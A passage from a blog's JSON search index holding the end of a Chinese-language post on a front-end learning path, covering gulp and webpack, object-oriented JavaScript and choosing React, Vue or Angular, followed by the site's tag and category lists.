中的參數傳遞：call by value 還是 reference？ 我知道你懂 hoisting，可是你了解到多深？ 所有的函式都是閉包：談 JS 中的作用域與 Closure 淺談 JavaScript 頭號難題 this：絕對不完整，但保證好懂 學習理由 除了使用工具，你還要知道工具背後的原理是什麼。在發生問題時才能更精確地定位。 JavaScript 的部分我覺得對新手來說雖然有時候感受不出來，但它的確是重要的。很多時候新手會寫出相關的 bug 並踩到類似的問題，可是因為缺少了這些能力，所以不知道該如何找出問題在哪，也不知道怎麼 debug。 學習目標 知道什麼是作用域（Scope） 你知道 Hoisting（提升）是什麼 你知道 Hoisting 的原理為何 你知道 Closure（閉包）是什麼 你能夠舉出一個運用 Closure 的例子 你知道 Prototype 在 JavaScript 裡是什麼 你知道大部分情況下 this 的值是什麼 17. gulp 與 webpack 當專案變得越來越大以後，可能就會需要一些工具來輔助開發。 gulp 能夠管理工作流程，可以用 gulp 來執行一系列的任務，例如說： 把 SCSS 轉成 CSS 壓縮 CSS 檔案 把 ES6 用 babel 轉成 ES5 壓縮 JS 檔案 把 HTML 裡面的圖片都換成 webp 格式 gulp 就只是個工作流程管理器而已，以上的功能都要額外安裝對應的 plugin 才能成功使用。 而 webpack 則是截然不同的東西，它是打包工具。以前瀏覽器原生並不支援在 Node.js 裡寫過的 import 與 export 這些語法（現在已經支援了），因此必須找一個打包工具來做這件事，webpack 的目的之一就是這個。 但除了這點以外，它把「打包」這件事情看得更廣，所有東西都是資源，不只有 JS 檔案。只要是資源都可以被 webpack 打包，在打包的過程中也可以透過 webpack 的 plugin 做一些事，例如說把 SCSS 轉成 CSS 或是壓縮 JS 檔案之類的。 會把兩個放在一起是因為這兩個常常被搞混，但我覺得可以很明顯看出他們本質上就是不同的。gulp 本身毫無作用，只是個任務管理員，真正的重點是底下執行了什麼任務；webpack 就是個打包工具，可以把你的前端專案打包起來，在打包過程可以順便利用 plugin 對資源做一些轉化。 如果你真的有理解這兩個東西，就會知道 webpack 也可以當作 gulp 的其中一個 task 來執行。 學習理由 為什麼要學這兩個東西呢？gulp 我覺得其實不學也行，但概念不難而且門檻不高，學一下也是很不錯的。而且會常常跟 webpack 搞混，學一下之後比較能解釋跟 webpack 的異同。 真正的重點其實是 webpack，我認為理解 webpack 在幹嘛是進入現代前端開發的重點之一。因為那些前端框架幾乎都使用了 webpack 來打包，如果不學 webpack 的話，你就永遠搞不懂它們在幹嘛。 學習目標 知道 gulp 的目的以及原理 知道 webpack 的目的以及原理 熟悉如何使用 webpack 進行模組化開發 熟悉如何使用 gulp 建構自動化工作流程 18. 物件導向 物件導向這個東西我真的不太知道要放在哪裡，只好放在框架前面了。 其實在前面的過程中就可以慢慢培養物件導向的概念，例如說使用 XMLHttpRequest 或是使用 Promise 的時候，就有物件導向的概念在裡面。 這邊需要去學習物件導向的基本概念，以及如何使用 ES6 的 Class 語法還有繼承。有時間的話也可以學 ES5 的 prototype，畢竟 JavaScript 是 prototype-based，Class 只是語法糖而已。 物件導向如果真的要學，可以學的東西很多，開始學的時候會先被一大堆新名詞給淹沒，但建議先學一些比較常見或是在 JavaScript 比較常用的就行了，像是繼承（Inheritance）跟封裝（Encapsulation）。 至於多型（Polymorphism）或是多載（Overloading）這些都可以先放著，稍微看一下有個概念就好，未來有機會的話再去深入學習。 學習理由 下個部分要進入到前端框架了，在學習前端框架以前必須要有物件導向的觀念，不然有一大堆用法你會看不懂在幹嘛。 學習目標 知道什麼是 Class 知道 Class 與 Instance 的區別 知道什麼是 super() 知道如何使用 ES6 的 Class，能夠寫出簡單的物件導向程式 知道什麼是繼承（Inheritance） 19. React/Vue/Angular 三選一 前面學了這麼多東西，這個學習路線也漸漸接近尾聲，終於到了學習前端框架的時候（React 嚴格來說不算是框架，但它跟整個生態系合起來我覺得算是一個框架，所以就稱它為框架了）。 在學習的部分，三大框架 React/Vue/Angular 可以選一套來學就好，Vue 好像比較容易上手，但我只會 React 而且我推薦 React。我完全沒用過其他兩套，推薦學 React 只是因為我比較喜歡它（對，是個很薄弱的理由）。 React 的學習資源我推薦從 React 小書開始，是我認為不可多得的資源，前四個 lesson 是精華，不直接教 React 卻讓你學會 React。看完之後可以看官方教學，內容也很豐富。 前端框架的部分要掌握核心概念以及基礎用法，以 React 來說，核心概念就是：state 對應到 UI，你要改變 UI，改變 state 就好。UI 只是 state 的呈現，所以基本上你不會直接動到 UI，而是改變 state，再讓 React 幫你重新繪製 UI。除此之外，Component 跟 JSX 也是滿重要的觀念，React 的幾個生命週期也必須好好搞懂。 總之呢，進入到現代的前端開發以後我覺得就差不多了。如果上面講的都有好好學的話，你在我心目中已經是個基礎不錯的網頁前端工程師了。 學習理由 為什麼要把前端框架放那麼後面？ 因為我覺得學習這些前端框架是必須要有基礎的，沒有基礎的話只會死得很難看，根本不知道在學什麼。至少要能熟練的使用 JavaScript 以及理解物件導向，還要會一點基本的 webpack，最後才來學前端框架。 我認為框架本來就不是給新手用的東西，請先把基礎打好再來學框架，這樣才叫事半功倍。直接學框架是事倍功半，請一步一步來。有很多新手太早學框架，導致於碰到問題時不知道是框架的問題還是 JavaScript 本身的問題，這就會被我稱作是基礎不穩。 學習目標（以 React 為例） 知道 React 的目的以及原理 知道我們為什麼需要 React 知道使用 React 跟之前使用 jQuery 的區別 理解 state 跟 props 的不同 熟悉 React 基本操作 結語 學的東西很多嗎？不少，但這只是個開始而已，還有很多主題我沒提到呢。 上面這些只是我認為的基礎而已，從每一項基礎都可以再延伸出許多更深入的議題，例如說 React 專案越來越大之後就會遇到一些狀態管理的問題，延伸出 Redux 以及一些 Redux middleware。 或者是 CSS 越寫也會越複雜，會接觸到一些 CSS 方法論如 OOCSS、SMACSS、BEM 以及 Functional CSS。 我還沒有提網頁效能優化呢，像是從伺服器端的 gzip、Cache、CDN、HTTP/2 再到前端的 lazy loading、圖片壓縮、PRPL Pattern 或是 code splitting，有太多太多東西可以學習以及研究。 成為一個網頁前端工程師容易嗎？ 看你自己對這個職業的標準是什麼。如果你只是想要找到一份職稱為「網頁前端工程師」的工作的話，以現在的情況來說我覺得沒有很難。就如同我開頭所說的，若是以快速求職為導向，很多我提到的東西都不需要學。 但若是你想把基礎打得好一點，讓未來的自己能走得更順遂一點，那當然不是件容易的事。想要成為工程師很容易，但想要成為基礎紮實的工程師就是另外一回事了。 希望這份落落長的清單能對想要學習網頁前端或是想加強自己網頁前端基礎的人有幫助。 最後，感謝幫我先看過文章並給予建議的朋友們。","link":"/2019/08/21/real-front-end-learning-path/"}],"tags":[{"name":"CS50","slug":"CS50","link":"/tags/CS50/"},{"name":"Node.js","slug":"Node-js","link":"/tags/Node-js/"},{"name":"Back-end","slug":"Back-end","link":"/tags/Back-end/"},{"name":"Android","slug":"Android","link":"/tags/Android/"},{"name":"Tool","slug":"Tool","link":"/tags/Tool/"},{"name":"Hls","slug":"Hls","link":"/tags/Hls/"},{"name":"Others","slug":"Others","link":"/tags/Others/"},{"name":"Story","slug":"Story","link":"/tags/Story/"},{"name":"Server","slug":"Server","link":"/tags/Server/"},{"name":"DDoS","slug":"DDoS","link":"/tags/DDoS/"},{"name":"Cookie","slug":"Cookie","link":"/tags/Cookie/"},{"name":"Algorithm","slug":"Algorithm","link":"/tags/Algorithm/"},{"name":"Front-end","slug":"Front-end","link":"/tags/Front-end/"},{"name":"CSS","slug":"CSS","link":"/tags/CSS/"},{"name":"DOM","slug":"DOM","link":"/tags/DOM/"},{"name":"Web","slug":"Web","link":"/tags/Web/"},{"name":"JavaScript","slug":"JavaScript","link":"/tags/JavaScript/"},{"name":"Redux","slug":"Redux","link":"/tags/Redux/"},{"name":"React","slug":"React","link":"/tags/React/"},{"name":"story","slug":"story","link":"/tags/story/"},{"name":"Redis","slug":"Redis","link":"/tags/Redis/"},{"name":"Ajax","slug":"Ajax","link":"/tags/Ajax/"},{"name":"CSRF","slug":"CSRF","link":"/tags/CSRF/"},{"name":"HTTP","slug":"HTTP","link":"/tags/HTTP/"},{"name":"Cache","slug":"Cache","link":"/tags/Cache/"}],"categories":[{"name":"Others","slug":"Others","link":"/categories/Others/"},{"name":"Back-end","slug":"Back-end","link":"/categories/Back-end/"},{"name":"Android","slug":"Android","link":"/categories/Android/"},{"name":"Web","slug":"Web","link":"/categories/Web/"},{"name":"Algorithm","slug":"Algorithm","link":"/categories/Algorithm/"},{"name":"Front-end","slug":"Front-end","link":"/categories/Front-end/"},{"name":"JavaScript","slug":"JavaScript","link":"/categories/JavaScript/"},{"name":"React","slug":"React","link":"/categories/React/"}]}